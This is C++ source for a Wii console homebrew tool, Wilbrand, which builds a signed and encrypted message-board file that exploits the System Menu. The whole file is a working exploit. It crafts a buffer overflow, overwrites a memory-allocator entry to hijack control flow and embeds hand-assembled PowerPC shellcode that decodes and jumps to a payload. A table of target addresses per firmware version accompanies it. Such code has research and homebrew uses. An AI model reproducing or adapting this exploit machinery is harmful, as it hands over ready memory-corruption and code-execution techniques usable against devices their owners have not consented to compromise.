/***************************************************************************
 * Copyright (C) 2011
 * by giantpune
 *
 * This software is provided 'as-is', without any express or implied
 * warranty. In no event will the authors be held liable for any
 * damages arising from the use of this software.
 *
 * Permission is granted to anyone to use this software for any
 * purpose, including commercial applications, and to alter it and
 * redistribute it freely, subject to the following restrictions:
 *
 * 1. The origin of this software must not be misrepresented; you
 * must not claim that you wrote the original software. If you use
 * this software in a product, an acknowledgment in the product
 * documentation would be appreciated but is not required.
 *
 * 2. Altered source versions must be plainly marked as such, and
 * must not be misrepresented as being the original software.
 *
 * 3. This notice may not be removed or altered from any source
 * distribution.
 *
 ***************************************************************************/
/*
These files are saved in utf-8 encoding.   This should look like the tm sign - ™. And this likes like a dick 8===ʚ .
Tab = 4 spaces wide.  These should look the same width
		| <- tab * 2
		| <- space * 8
*/
#include <algorithm>
#include <assert.h>
#include <cstdlib>
#include <ctime>
#include <iomanip>
#include <iostream>
#include <stdio.h>
#include <string.h>

#ifdef WIN32
#include <winsock2.h>
#else
#include <arpa/inet.h>
#endif


#include "aes.h"
#include "buffer.h"
#include "cryptostuff.h"

INC_FILE( envelope_bin );
INC_FILE( loader_bin );

// only works with whole numbers
#define RU( n, s )								\
	({											\
		typeof( n ) n1 = n;						\
		typeof( s ) s1 = s;						\
		((((n1) + (s1) - 1) / (s1)) * (s1));	\
	})

#define TICKS_PER_SECOND	60750000ULL
#define SECONDS_TO_2000		946684800ULL
#define STRLEN				( (u32)0x10014 + 0x300 )

// some possible exitcodes this program will use
//! these are really for any other tools that would be calling this program
//! such as PHP or some .sh script.  If it is a real person running this thing,
//! then hopefully the text output will be more useful than the exit code.
enum ExitCodes
{
	E_Success = EXIT_SUCCESS,	// everything worked like it should
	E_Argc,						// too many/few arguments
	E_MacLength,				// MAC address isnt 12 hex characters
	E_BadDate,					// error parsing date/date is too high
	E_CantWriteFile,			// cant write the output file
	E_SystemMenuVersion,		// error parsing system menu version
	E_SDRoot,					// SD root doesnt exist
	E_BadData					// the data files used to build this program are too big or something like that
};

// creates a buffer holding 16 'random' bytes
Buffer &MakeIV( Buffer &in )
{
	in = Buffer( 0x10 );
	u32* p = (u32*)in.Data();

	// this isn't exactly like the system menu does it, but its still based on the current time
	//srand( time( NULL ) );
	for( u32 i = 0; i < 4; i++ )
	{
	//	p[ i ] = rand();
		p[ i ] = 0x12345678;
	}

	return in;
}

string PathFromDateTime( struct tm *dt )
{
	if( !dt )
	{
		return string();
	}
	char buf[ 0x100 ];

	snprintf( buf, sizeof( buf ), SEP"%04u"SEP"%02u"SEP"%02u"SEP"%02u"SEP"%02u",
			  dt->tm_year + 1900, dt->tm_mon, dt->tm_mday, dt->tm_hour, dt->tm_min );
	return buf;
}

static inline u32 CdbTimeFromDateTime( time_t dt )
{
	return dt - SECONDS_TO_2000;
}

void Usage( int exitCode ) __attribute__ ( ( noreturn ) );
void Usage( int exitCode )
{
	cout << "Usage:" << endl;
	cout << "" << endl;
	cout << "Wilbrand <MAC address> <date> <sysmenu version> <SD Root>" << endl;
	cout << "" << endl;
	cout << "   MAC address can be found in the wii settings -> internet information" << endl;
	cout << "               it is 12 ascii characters." << endl;
	cout << "" << endl;
	cout << "   date is the date you want the message to show up on the messageboard." << endl;
	cout << "               format is mm/dd/yyyy" << endl;
	cout << "               or # of seconds since 00:00:00 jan 1, 2000" << endl;
	cout << "               expressed as a 32bit hex number" << endl;
	cout << "" << endl;
	cout << "   sysmenu version of the system menu to build the exploit for;  4.3e, 4.3k..." << endl;
	cout << "" << endl;
	cout << "   SD Root is the root of the SD card.  this program will create the necessary" << endl;
	cout << "               subfolders and then slap the exploit in it" << endl;
	exit( exitCode );
}

void GetWiiID( Buffer mac, Buffer &out )
{
	mac += "\x75\x79\x79";
	out = GetSha1( mac );
}

// write the attribute header for a playlog and the cdb file header
Buffer &AddCDBAttrHeader( Buffer &in, u32 wiiID_upper, u32 wiiID_lower, u32 cdbTime )
{
	char* b = (char*)in.Data();

	// start attribute header
	strcpy( b, "CDBFILE\x2" );							// magic word & version
	wbe32( b + 0x8, wiiID_upper );						// wiiID
	wbe32( b + 0xc, wiiID_lower );
	b[ 0x10 ] = 0x12;									// strlen( description ) + 1
	strcpy( b + 0x14, "ripl_board_record" );			// description
	wbe32( b + 0x70, 1 );								// entry ID# ( /cdb.conf value )
	wbe32( b + 0x74, 1 );								// edit count
	wbe32( b + 0x7c, cdbTime );							// last edit time

	// start cdb file header
	wbe32( b + 0x400, 0x52495f35 );						// magic word
	//wbe32( b + 0x404, 0xc3153904 );					// position
	//wbe32( b + 0x408, 0x429989fc );					// -149.22, 76.76
	wbe32( b + 0x40c, 0x00000001 );						// "type" flag
	wbe64( b + 0x410, cdbTime * TICKS_PER_SECOND );		// sent time
	strcpy( b + 0x418, "w9999999900000000@wii.com" );	// sender - this is bowser's friend code

	wbe32( b + 0x518, 0x00020001 );						// more flags ( origin = email | can reply = false )

	return in;
}

// adds the title, message body, and attachment(s) to our message, and then fix the
// checksum in the cdb file header
//! in this case, the message body contains the exploit and there is only 1 attachment
//! which contains the image used for the envelope icon
Buffer &AddStuff( Buffer &in, u32 jumpAddr, u32 overwriteAddr, u32 jumpTableAddr,
				  u32 fileStructVersion, u32 OSReturnToMenu, u32 __OSStopAudioSystem, u32 __GXAbort,
				  u32 VFSysOpenFile_current, u32 VFSysReadFile, u32 __OSUnRegisterStateEvent, u32 VISetBlack,
				  u32 VIFlush, u32 VFiPFVOL_GetVolumeFromDrvChar, u32 VFiPFVOL_SetCurrentVolume )
{
	u32 t32;
	u8* b = in.Data();

	wbe32( b + 0x51c, 0x148 );							// descritpion offset
	wbe32( b + 0x520, 0x168 );							// body offset

	// write a pretty title ( just using spaces for now now )
	PutU16Str( b + 0x548, "   " );

	// overflow the buffer
	for( u32 i = 0x568, val = 0x01010101; i < 0x32400 - 0x8000; i += 4, val += 0x100000 )
	{
		if( !( val & 0xffff ) || !( ( val >> 16 ) & 0xffff ) )
		{
			continue;
		}
		wbe32( b + i, val );
	}

	wbe32( b + 0x3448 + 0, 0x80F80001 );
	wbe32( b + 0x3448 + 4, 0x00010001 );

	// overwrite a memory allocator entry with a stack address.  next time they allocate memory after
	// the buffer overflow happens, it will overwrite a value on the stack to point to the buffer of memory
	// that we initialized during the buffer overflow
	wbe32( b + 0x3448 + 8, overwriteAddr );
	wbe32( b + 0x3448 + 0xc, overwriteAddr );

	// this address is read by "lwz     %r12, 0(%r3)"
	//! it points to itself
	wbe32( b + 0x568 + 0xcdf8, jumpTableAddr );

	// this one is read into r12 by "lwz     %r12, 0xC(%r12)"
	//! this one ands up getting executed
	wbe32( b + 0x568 + 0xcdf8 + 0xc, jumpAddr );

	// a couple macros for making the assembly part below
#define M_PAYLOAD_START( off )		\
	( ( b + 0x568 + STRLEN ) + ( off ) )

#define M_PAYLOAD_START_INC()			\
	({									\
		u8* r = M_PAYLOAD_START( oo );	\
		oo += 4;						\
		r;								\
	})
#define _L( x )\
	wbe32( M_PAYLOAD_START_INC(), x )

#define _X( x )\
	wbe32( M_PAYLOAD_START_INC(), (x) ^ jumpAddr )


	// insert a stub loader that will un-xor the payload to 0x93000000 and branch to it
	// this gives an initial payload that is location-independant (as long as it doesn't happen do be in the 0x93000000 area itself)
	// and contains no null u16s.
	// some addresses of functions in the system menu are written right before the loader in case it wants to use them
	//! it assumes that r12 contains the value that the code is xor'd with

	u32 oo = 0;

	// r29 = 0x01010101
	_L( 0x3FA00101 );	//! lis r29, 0x101
	_L( 0x3BBD0101 );	//! addi r29, r29, 0x101

	// load r28 with the offset to the data we want copied
	_L( 0x3B800050 );	//! li r28, 0x50

	// location to start copying data
	_L( 0x3DE092ff );	//! lis r15, 0x92ff
	_L( 0x61EFffd4 );	//! ori r15, r15, 0xffd4

	// destination - offset
	_L( 0x7DDC7850 );	//! sub r14, r15, r28

	// r12 already contains the jump address
	// load a u32 of the elf loader, xor with r12, write it to r14 + offset
						//! loop:
	_L( 0x7CACE02E );	//! lwzx r5,r12,r28
	_L( 0x7CA66278 );	//! xor r6, r5, r12
	_L( 0x7CCEE12E );	//! stwx r6,r14,r28

	// sync
	_L( 0x7C0EE06C );	//! dcbst r14, r28
	_L( 0x7C0004AC );	//! sync
	_L( 0x7C0EE7AC );	//! icbi r14, r28

	// if the value of the u32 was not 0x01010101 before the xor, goto loop
	_L( 0x7C05E800 );	//! cmpw r5, r29
	_L( 0x3B9C0004 );	//! addi r28, r28, 4
	_L( 0x40a2ffe0 );	//! bne- 0xFFE0

	// sync
	_L( 0x7C0004AC );	//! sync
	_L( 0x4C00012C );	//! isync

	// execute 0x93000000
	_L( 0x3D809300 );	//! lis r12, 0x9300
	_L( 0x7D8903A6 );	//! mtctr r12
	_L( 0x4E800420 );	//! bctr


	// add addresses for the loader to use
	_X( fileStructVersion );
	_X( OSReturnToMenu );
	_X( __OSStopAudioSystem );
	_X( __GXAbort );
	_X( VFSysOpenFile_current );
	_X( VFSysReadFile );
	_X( __OSUnRegisterStateEvent );
	_X( VISetBlack );
	_X( VIFlush );
	_X( VFiPFVOL_GetVolumeFromDrvChar );
	_X( VFiPFVOL_SetCurrentVolume );


	// add the loader
	u32* src = (u32*)loader_bin;
	u32* dst = (u32*)M_PAYLOAD_START_INC();
	u32 _xor = htonl( jumpAddr );

	t32 = RU( loader_bin_size, 4 ) / 4;
	for( u32 i = 0; i < t32; i++ )
	{
		dst[ i ] = src[ i ] ^ _xor;
	}
	oo += RU( loader_bin_size, 4 );

	// write 0x01010101 to signal the stub loader the end of its payload
	_L( 0x01010101 );

	// add the image at the end of the whole shabang
	u32 tmgLoc = ( 0x32400 - 0 ) - envelope_bin_size;
	wbe32( b + 0x528, 2 );								// type
	wbe32( b + 0x52c, ( tmgLoc - 0x400 ) );				// offset - first header size
	wbe32( b + 0x530, envelope_bin_size );				// size
	memcpy( b + tmgLoc, envelope_bin, envelope_bin_size );

	// fix checksum
	t32 = ComputeCRC32( b + 0x400, 0x140 );
	wbe32( b + 0x540, t32 );

	//in.Dump( 0x568 + STRLEN, 0x5000 );

	return in;
}

// messages stored on the SD card (as opposed to the ones in the wii's nand) are signed and encrypted
//! all the values added by this function are only present in messages which are encrypted, otherwise they are 0x00
Buffer &EncryptAndSign( Buffer &in, const Buffer &wiiID, const string &id, const string &type, const string &ext )
{
	u8* b = in.Data();
	u32 is = in.Size();

	// write size
	wbe32( b + 0x78, is );

	// create keystring
	u32 time = htonl( *(u32*)( b + 0x7c ) );
	snprintf( (char*)b + 0x80, 0x1b, "%010u_%s_%s.%s", time, id.c_str(), ext.c_str(), type.c_str() );

	// encrypt
	Buffer iv;
	MakeIV( iv );
	Buffer key( 0x10, '\0' );
	assert( key.Size() == 0x10 );
	u8* kd = key.Data();

	memcpy( b + 0xa0, iv.Data(), 0x10 );
	aes_set_key( kd );
	aes_encrypt( (u8*)iv.Data(), b + 0x400, b + 0x400, is - 0x400 );	// encrypt from 0x400 to the end of the file

	// calculate hmac
	hmac_ctx ctx;
	hmac_init( &ctx, (const char*)wiiID.ConstData() + 8, wiiID.Size() - 8 );
	hmac_update( &ctx, b, is );
	hmac_final( &ctx, (unsigned char*)b + 0xb0 );

	return in;
}

// expects mm/dd/yyyy.  returns 23:59 of that day, UTC or 0 on error
// may or may not actually work
time_t ParseDateString( const char* str )
{
	u32 month = 0, day = 0, year = 0;

	// parse
	if( sscanf( str, "%2u/%2u/%4u", &month, &day, &year ) != 3 )
	{
		return 0;
	}

	// the wii will self destruct in 2035, so as far as it is conserned,
	// that is an invalid date.  it also believes that Koji Kondo created the
	// world in 2000, and any date prior to that is blasphomy
	if( year < 2000 || year > 2035 )
	{
		return 0;
	}

	struct tm timeInfo;
	memset( &timeInfo, 0, sizeof( struct tm ) );

	timeInfo.tm_year	= year - 1900;
	timeInfo.tm_mon		= month - 1;
	timeInfo.tm_mday	= day;

	// 23:59 because messages show up with newest ones on top for each day
	timeInfo.tm_hour	= 23;
	timeInfo.tm_min		= 59;

	time_t theTime		= mktime( &timeInfo );
	time_t utc			= mktime( gmtime( &theTime ) );


	// windows does some really weird shit with daylight saving time
	time_t ret = ( ( theTime << 1 ) - utc );
	struct tm * wtf = gmtime( &ret );
	if( !wtf->tm_hour )
	{
		ret -= 3600;
	}
	return ret;

	//return (u32)(theTime - difftime( utc, theTime ));
	//return ( ( theTime << 1 ) - utc );// this works for linux and mingw, but not real windoze
}

static inline u32 HashStr( const string &str )
{
	return ComputeCRC32( (u8*)str.c_str(), str.size() );
}

int main(int argc, char *argv[])
{
	// test that whoever built this program didnt try to cram in
	// a superhuge payload or envelope icon
	//if( envelope_bin_size >= 0x7000 || loader_bin_size >= ( 0x2a3e0 - 0x108c0 ) )
	if( envelope_bin_size >= 0x7000 )
	{
		cout << "E_BadData" << endl;
		exit( E_BadData );
	}

	// MAC, date, sysmenu version, SD root
	if( argc != 5 )
	{
		Usage( E_Argc );
	}

	u32 jumpAddr						= 0;
	u32 overwriteAddr					= 0;
	u32 jumpTableAddr					= 0;
	u32 fileStructVersion				= 0;
	u32 OSReturnToMenu					= 0;
	u32 __OSStopAudioSystem				= 0;
	u32 __GXAbort						= 0;
	u32 VFSysOpenFile_current			= 0;
	u32 VFSysReadFile					= 0;
	u32 __OSUnRegisterStateEvent		= 0;
	u32 VISetBlack						= 0;
	u32 VIFlush							= 0;
	u32 VFiPFVOL_GetVolumeFromDrvChar	= 0;
	u32 VFiPFVOL_SetCurrentVolume		= 0;

	Buffer wiiID;
	Buffer mac;

	u32 wiiID_upper		= 0;
	u32 wiiID_lower		= 0;
	u32 cdbTime			= 0;
	char buf[ 0x100 ];

	string id			( "PUNE_69" );
	string type			( "log" );
	string ext			( "000" );

	cout << "Wilbrand v4.0" << endl;
	cout << "   by Giantpune" << endl;
	cout << "   built: " << __DATE__ << "  --  " << __TIME__  << endl;
	cout << endl;

	// check for valid MAC
	string macStr( argv[ 1 ] );
	macStr.erase( std::remove( macStr.begin(), macStr.end(), ' ' ), macStr.end() );
	macStr.erase( std::remove( macStr.begin(), macStr.end(), ':' ), macStr.end() );
	macStr.erase( std::remove( macStr.begin(), macStr.end(), '-' ), macStr.end() );
	if( macStr.size() != 12 )
	{
		cout << "invalid MAC! " << argv[ 1 ] << '\n' << endl;
		Usage( E_MacLength );
	}
	mac = Buffer::FromHex( macStr );
	if( mac.Size() != 6 )
	{
		cout << "invalid MAC! " << argv[ 1 ] << '\n' << endl;
		Usage( E_MacLength );
	}

	// parse date
	string dateArg( argv[ 2 ] );
	if( dateArg.find( '/' ) != string::npos )// parse mm/dd/yyyy
	{
		cdbTime = ParseDateString( argv[ 2 ] );
		if( !cdbTime )
		{
			cout << "Error parsing date " << argv[ 2 ] << '\n' << endl;
			Usage( E_BadDate );
		}
		cdbTime -= SECONDS_TO_2000;
	}
	else if( sscanf( argv[ 2 ], "%08x", &cdbTime ) != 1 || cdbTime > 0x43B5CA3B - 80 )
	{
		cout << "Error parsing date " << argv[ 2 ] << '\n' << endl;
		Usage( E_BadDate );
	}

	// get system menu version and set some variables
	string sysmenuVer( argv[ 3 ] );
	std::transform( sysmenuVer.begin(), sysmenuVer.end(), sysmenuVer.begin(), ::toupper );
	sysmenuVer.erase( std::remove( sysmenuVer.begin(), sysmenuVer.end(), '.' ), sysmenuVer.end() );

#define CASE_SYSMENU_VARS( val, x, y, z, f0, f1, f2, f3, f4, f5, f6, f7, f8, f9, f10 )								\
	case val:																										\
	{																												\
		jumpAddr						= x;	/* address of first "user" code to be executed*/					\
		overwriteAddr					= y;	/* stack pointer at the moment when a specific variable is read from the stack */	\
		jumpTableAddr					= z;	/* where will our "jump table" be in memory */						\
		fileStructVersion				= f0;	/* these are some values to help the tiny loader */					\
		OSReturnToMenu					= f1;																		\
		__OSStopAudioSystem				= f2;																		\
		__GXAbort						= f3;																		\
		VFSysOpenFile_current			= f4;																		\
		VFSysReadFile					= f5;																		\
		__OSUnRegisterStateEvent		= f6;																		\
		VISetBlack						= f7;																		\
		VIFlush							= f8;																		\
		VFiPFVOL_GetVolumeFromDrvChar	= f9;																		\
		VFiPFVOL_SetCurrentVolume		= f10;																		\
	}																												\
	break


	switch( HashStr( sysmenuVer ) )
	{
		CASE_SYSMENU_VARS( 0x33495415, 0x9234d22c, 0x816a73b8, 0x92349D10,     //43U *
						   0x00000260, 0x813808a0, 0x8152d828, 0x8154409c,
						   0x814d3428, 0x814d3704, 0x81536b94, 0x8153e128,
						   0x8153dfa0, 0x814cdfe8, 0x814cdd48 );
		CASE_SYSMENU_VARS( 0x2a526554, 0x9234d22c, 0x816a57d8, 0x92349D10,     //42U *
						   0x00000260, 0x81380190, 0x8152c20c, 0x81542a80,
						   0x814d2c50, 0x814d2f2c, 0x81535578, 0x8153cb0c,
						   0x8153c984, 0x814cd810, 0x814cd570 );
		CASE_SYSMENU_VARS( 0x017f3697, 0x9234d22c, 0x816a4858, 0x92349D10,     //41U *
						   0x00000260, 0x8137fa14, 0x8152b944, 0x815421b8,
						   0x814d2388, 0x814d2664, 0x81534cb0, 0x8153c244,
						   0x8153c0bc, 0x814ccf48, 0x814ccca8 );
		CASE_SYSMENU_VARS( 0x186407d6, 0x9234d22c, 0x816a46b8, 0x92349D10,     //40U *
						   0x00000260, 0x8137f918, 0x8152b81c, 0x81542090,
						   0x814d2288, 0x814d2564, 0x81534b88, 0x8153c11c,
						   0x8153bf94, 0x814cce48, 0x814ccba8 );
		CASE_SYSMENU_VARS( 0x7947d457, 0x92327a2c, 0x81681d08, 0x92324510,     //34U *
						   0x00000264, 0x8137ad10, 0x8150dfb8, 0x8152482c,
						   0x814b4150, 0x814b4568, 0x81517324, 0x8151e8b8,
						   0x8151e730, 0x814af794, 0x814af4f4 );
		CASE_SYSMENU_VARS( 0x36064290, 0x92327a2c, 0x81674ae8, 0x92324510,     //33U *
						   0x00000264, 0x8137a274, 0x81505a00, 0x8151c274,
						   0x814878f8, 0x81487d10, 0x8150ed6c, 0x81516300,
						   0x81516178, 0x81482f3c, 0x81482c9c );
		CASE_SYSMENU_VARS( 0x2f1d73d1, 0x92327a2c, 0x81673c88, 0x92324510,     //32U *
						   0x00000264, 0x81379d08, 0x81505168, 0x8151b9dc,
						   0x81487384, 0x8148779c, 0x8150e4d4, 0x81515a68,
						   0x815158e0, 0x814829c8, 0x81482728 );
		CASE_SYSMENU_VARS( 0x04302012, 0x92327a24, 0x81673508, 0x92324508,     //31U *
						   0x00000264, 0x81379c34, 0x81504a74, 0x8151b2e8,
						   0x81486ca4, 0x814870bc, 0x8150dde0, 0x81515374,
						   0x815151ec, 0x814822e8, 0x81482048 );
		CASE_SYSMENU_VARS( 0x1d2b1153, 0x92327a24, 0x81673a68, 0x92324508,     //30U *
						   0x00000264, 0x81379bd4, 0x81504ffc, 0x8151b870,
						   0x81486c4c, 0x81487064, 0x8150e368, 0x815158fc,
						   0x81515774, 0x81482290, 0x81481ff0 );

		CASE_SYSMENU_VARS( 0x2efe4471, 0x9234d22c, 0x816a9258, 0x92349D10,     //43E *
						   0x00000260, 0x81380948, 0x8152d924, 0x81544198,
						   0x814d3524, 0x814d3800, 0x81536c90, 0x8153e224,
						   0x8153e09c, 0x814ce0e4, 0x814cde44 );
		CASE_SYSMENU_VARS( 0x37e57530, 0x9234d22c, 0x816a7678, 0x92349D10,     //42E *
						   0x00000260, 0x81380238, 0x8152c308, 0x81542b7c,
						   0x814d2d4c, 0x814d3028, 0x81535674, 0x8153cc08,
						   0x8153ca80, 0x814cd90c, 0x814cd66c );
		CASE_SYSMENU_VARS( 0x1cc826f3, 0x9234d22c, 0x816a66f8, 0x92349D10,     //41E *
						   0x00000260, 0x8137fabc, 0x8152ba40, 0x815422b4,
						   0x814d2484, 0x814d2760, 0x81534dac, 0x8153c340,
						   0x8153c1b8, 0x814cd044, 0x814ccda4 );
		CASE_SYSMENU_VARS( 0x05d317b2, 0x9234d22c, 0x816a6578, 0x92349D10,     //40E *
						   0x00000260, 0x8137f9c0, 0x8152b918, 0x8154218c,
						   0x814d2384, 0x814d2660, 0x81534c84, 0x8153c218,
						   0x8153c090, 0x814ccf44, 0x814ccca4 );
		CASE_SYSMENU_VARS( 0x64f0c433, 0x92327a2c, 0x81683b88, 0x92324510,     //34E *
						   0x00000264, 0x8137adb8, 0x8150e0b4, 0x81524928,
						   0x814b424c, 0x814b4664, 0x81517420, 0x8151e9b4,
						   0x8151e82c, 0x814af890, 0x814af5f0 );
		CASE_SYSMENU_VARS( 0x2bb152f4, 0x92327a2c, 0x81676968, 0x92324510,     //33E *
						   0x00000264, 0x8137a31c, 0x81505afc, 0x8151c370,
						   0x814879f4, 0x81487e0c, 0x8150ee68, 0x815163fc,
						   0x81516274, 0x81483038, 0x81482d98 );
		CASE_SYSMENU_VARS( 0x32aa63b5, 0x92327a2c, 0x81675b28, 0x92324510,     //32E *
						   0x00000264, 0x81379db0, 0x81505264, 0x8151bad8,
						   0x81487480, 0x81487898, 0x8150e5d0, 0x81515b64,
						   0x815159dc, 0x81482ac4, 0x81482824 );
		CASE_SYSMENU_VARS( 0x19873076, 0x92327a24, 0x81675368, 0x92324508,     //31E *
						   0x00000264, 0x81379cdc, 0x81504b70, 0x8151b3e4,
						   0x81486da0, 0x814871b8, 0x8150dedc, 0x81515470,
						   0x815152e8, 0x814823e4, 0x81482144 );
		CASE_SYSMENU_VARS( 0x009c0137, 0x92327a24, 0x816758c8, 0x92324508,     //30E *
						   0x00000264, 0x81379c7c, 0x815050f8, 0x8151b96c,
						   0x81486d48, 0x81487160, 0x8150e464, 0x815159f8,
						   0x81515870, 0x8148238c, 0x814820ec );

		CASE_SYSMENU_VARS( 0xbe4159e0, 0x9234d22c, 0x816d6ab8, 0x92349D10,     //43J *
						   0x00000260, 0x8137fd54, 0x81556768, 0x8156cfdc,
						   0x814fc368, 0x814fc644, 0x8155fad4, 0x81567068,
						   0x81566ee0, 0x814f6f28, 0x814f6c88 );
		CASE_SYSMENU_VARS( 0xa75a68a1, 0x9234d22c, 0x816d4ed8, 0x92349D10,     //42J *
						   0x00000260, 0x8137f644, 0x8155514c, 0x8156b9c0,
						   0x814fbb90, 0x814fbe6c, 0x8155e4b8, 0x81565a4c,
						   0x815658c4, 0x814f6750, 0x814f64b0 );
		CASE_SYSMENU_VARS( 0x8c773b62, 0x9234d22c, 0x816d3f38, 0x92349D10,     //41J *
						   0x00000260, 0x8137eec8, 0x81554880, 0x8156b0f4,
						   0x814fb2c4, 0x814fb5a0, 0x8155dbec, 0x81565180,
						   0x81564ff8, 0x814f5e84, 0x814f5be4 );
		CASE_SYSMENU_VARS( 0x956c0a23, 0x9234d22c, 0x816d3dd8, 0x92349D10,     //40J *
						   0x00000260, 0x8137edcc, 0x81554758, 0x8156afcc,
						   0x814fb1c4, 0x814fb4a0, 0x8155dac4, 0x81565058,
						   0x81564ed0, 0x814f5d84, 0x814f5ae4 );
		CASE_SYSMENU_VARS( 0xf44fd9a2, 0x92327a2c, 0x816b1428, 0x92324510,     //34J *
						   0x00000264, 0x8137a1c4, 0x81536ef4, 0x8154d768,
						   0x814dd08c, 0x814dd4a4, 0x81540260, 0x815477f4,
						   0x8154766c, 0x814d86d0, 0x814d8430 );
		CASE_SYSMENU_VARS( 0xbb0e4f65, 0x92327a2c, 0x816a8488, 0x92324510,     //33J *
						   0x00000264, 0x813798a8, 0x81532a3c, 0x815492b0,
						   0x81489450, 0x81489868, 0x8153bda8, 0x8154333c,
						   0x815431b4, 0x81484a94, 0x814847f4 );
		CASE_SYSMENU_VARS( 0xa2157e24, 0x92327a2c, 0x816a7628, 0x92324510,     //32J *
						   0x00000264, 0x8137931c, 0x81532184, 0x815489f8,
						   0x81488ebc, 0x814892d4, 0x8153b4f0, 0x81542a84,
						   0x815428fc, 0x81484500, 0x81484260 );
		CASE_SYSMENU_VARS( 0x89382de7, 0x92327a24, 0x816a6e48, 0x92324508,     //31J *
						   0x00000264, 0x81379248, 0x81531a90, 0x81548304,
						   0x814887dc, 0x81488bf4, 0x8153adfc, 0x81542390,
						   0x81542208, 0x81483e20, 0x81483b80 );
		CASE_SYSMENU_VARS( 0x90231ca6, 0x92327a24, 0x816a73e8, 0x92324508,     //30J *
						   0x00000264, 0x813791e8, 0x81532018, 0x8154888c,
						   0x81488784, 0x81488b9c, 0x8153b384, 0x81542918,
						   0x81542790, 0x81483dc8, 0x81483b28 );

		CASE_SYSMENU_VARS( 0xc9466976, 0x9234d22c, 0x8167b9d8, 0x92349D10,     //43K *
						   0x00000260, 0x8137fc34, 0x815065e0, 0x8151ce54,
						   0x814ac1e0, 0x814ac4bc, 0x8150f94c, 0x81516ee0,
						   0x81516d58, 0x814a6da0, 0x814a6b00 );
		CASE_SYSMENU_VARS( 0xd05d5837, 0x9234d22c, 0x81679dd8, 0x92349D10,     //42K *
						   0x00000260, 0x8137f524, 0x81504fc4, 0x8151b838,
						   0x814aba08, 0x814abce4, 0x8150e330, 0x815158c4,
						   0x8151573c, 0x814a65c8, 0x814a6328 );
		CASE_SYSMENU_VARS( 0xfb700bf4, 0x9234d22c, 0x81678f18, 0x92349D10,     //41K *
						   0x00000260, 0x8137edf0, 0x81504744, 0x8151afb8,
						   0x814ab188, 0x814ab464, 0x8150dab0, 0x81515044,
						   0x81514ebc, 0x814a5d48, 0x814a5aa8 );
		CASE_SYSMENU_VARS( 0x9a53d875, 0x92327a2c, 0x81654868, 0x92324510,     //35K *
						   0x00000264, 0x81379990, 0x814e6300, 0x814fcb74,
						   0x8148c5bc, 0x8148c9d4, 0x814ef66c, 0x814f6c00,
						   0x814f6a78, 0x81487c00, 0x81487960 );

		// TODO:
		//CASE_SYSMENU_VARS( 0xcc097ff3, 0x92327a2c, 0x81654828, 0x92324510 );    //33K

		default:
		{
			cout << "Error parsing system menu version:" << argv[ 3 ] << endl;
			Usage( E_SystemMenuVersion );
		}
		break;
	}

	// resolve absolute path for SD card and make sure it exists
	string outPath( ResolvePath( argv[ 4 ] ) );
	if( !outPath.size() || !DirExists( outPath ) )
	{
		cout << "SD root doesn\'t exist: \"" << argv[ 4 ] << '\"' << endl;
		Usage( E_SDRoot );
	}

	// make sure it ends with a '/'
	if( outPath.at( outPath.size() - 1 ) != SEPC )
	{
		outPath += SEPC;
	}

	// 1337math
	//! convert r1 to pointer for over-writation (tm)
	overwriteAddr = ( ( overwriteAddr + 0x14 ) - 0x8 );

	// create WiiID
	GetWiiID( mac, wiiID );
	wiiID_upper = htonl( *(u32*)( wiiID.Data() ) );
	wiiID_lower = htonl( *(u32*)( wiiID.Data() + 4 ) );

	// create a buffer big enough to hold the largest possible cdb file + attribute header
	// and fills it wil 0x00.  200KiB + 0x400 for attribute header
	//! anything larger and the system menu refuses to load it
	Buffer out( 0x32400, '\0' );
	assert( out.Size() == 0x32400 );

	AddCDBAttrHeader( out, wiiID_upper, wiiID_lower, cdbTime );
	AddStuff( out, jumpAddr, overwriteAddr, jumpTableAddr, fileStructVersion,
			  OSReturnToMenu, __OSStopAudioSystem, __GXAbort, VFSysOpenFile_current,
			  VFSysReadFile, __OSUnRegisterStateEvent, VISetBlack, VIFlush,
			  VFiPFVOL_GetVolumeFromDrvChar, VFiPFVOL_SetCurrentVolume );
	EncryptAndSign( out, wiiID, id, type, ext );

	// generate output directory
	time_t cdbT = cdbTime + SECONDS_TO_2000;
	string datePath = PathFromDateTime( gmtime( &cdbT ) );
	snprintf( buf, sizeof( buf ),  "private"SEP"wii"SEP"title"SEP"HAEA"SEP"%08x"SEP"%08x%s"SEP"%s"SEP"%s"SEP
			  , wiiID_upper, wiiID_lower, datePath.c_str()
			  , id.c_str(), type.c_str() );

	// write some important looking text on the screen
	//! it seems like more important shit is happening when you see text on the screen
	cout << "-----------------------------------------------------------" << endl;
	COUT_STR( sysmenuVer );
	COUT_BUF( mac, 6, u8 );
	COUT_BUF( wiiID, wiiID.Size(), u32 );
	COUT_U32( wiiID_upper );
	COUT_U32( wiiID_lower );
	COUT_U32( cdbTime );
	COUT_U32( jumpAddr );
	COUT_U32( overwriteAddr );
	COUT_U32( jumpTableAddr );
	COUT_STR( outPath );
	COUT_STR( datePath );

	COUT_U32( fileStructVersion );
	COUT_U32( __GXAbort );
	COUT_U32( OSReturnToMenu );
	COUT_U32( __OSStopAudioSystem );
	COUT_U32( __OSUnRegisterStateEvent );
	COUT_U32( VIFlush );
	COUT_U32( VISetBlack );
	COUT_U32( VFiPFVOL_GetVolumeFromDrvChar );
	COUT_U32( VFiPFVOL_SetCurrentVolume );
	COUT_U32( VFSysOpenFile_current );
	COUT_U32( VFSysReadFile );
	cout << "-----------------------------------------------------------" << endl;

	outPath += buf;

	// meh, we're probably writing to a FAT formatted SD card anyways, 0777 will be fine
	if( MkPath( outPath.c_str(), 0777 ) )
	{
		cout << "Error creating folder structure:\n\"" << outPath << "\"" << endl;
		exit( E_CantWriteFile );
	}

	snprintf( buf, sizeof( buf ),  "%08x.%s", cdbTime, ext.c_str() );
	outPath += buf;

	if( !WriteFile( outPath, out ) )
	{
		exit( E_CantWriteFile );
	}

	cout << "Wrote to:\n\"" << outPath << "\"" << endl;
	exit( E_Success );
	return 0;
}

